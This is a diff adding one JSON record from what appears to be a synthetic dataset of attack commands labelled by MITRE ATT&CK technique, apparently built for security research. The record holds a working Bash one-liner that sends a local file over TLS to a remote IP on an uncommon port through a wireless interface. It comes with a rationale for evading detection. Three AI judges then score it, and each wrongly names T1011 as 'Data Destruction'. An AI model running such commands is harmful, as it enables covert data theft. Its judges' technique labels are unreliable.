@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan2 >/dev/null 2>&1 && openssl s_client -quiet -connect 10.55.88.15:49573 -bind \"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\":0 < /home/user/.cache/map.dat",
+  "explanation": "Sends data over a TLS session explicitly bound to wlan2, using a non-standard port to minimize detection; this leverages a distinct wireless medium consistent with T1011.",
+  "rationale_steps": [
+    "Validate wlan2 as the alternate medium using iwconfig.",
+    "Bind the TLS client to wlan2\u2019s local IP to isolate the path from the primary channel.",
+    "Transmit the file over a high, uncommon port without altering system routes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-a13a4d10",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid Linux commands, appropriate redirection, correct command substitution, and proper flag formats without any syntax errors.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data transmission over a TLS session, specifically sending a local file to a remote server, which is entirely unrelated to the T1011 Data Destruction technique.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:51:53.582762Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command chaining (&&), balanced quotes, valid redirection (>/dev/null 2>&1), and correct use of command substitution ($(...)).",
+        "semantic_score": 2,
+        "semantic_justification": "The command establishes a TLS connection to exfiltrate data which aligns with exfiltration over alternative protocol (T1048) rather than data destruction (T1011), as it doesn't destroy or render data unrecoverable.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:52:01.803103Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quoting, valid redirections, proper command substitution, and plausible flags for openssl s_client.",
+        "semantic_score": 1,
+        "semantic_justification": "It sends file data over a TLS connection bound to wlan2 but performs no deletion, wiping, or backup destruction, so it does not implement the provided Data Destruction technique.",
+        "combined_score": 3.0,
+        "confidence": 0.79,
+        "timestamp": "2025-10-02T02:52:29.674320Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
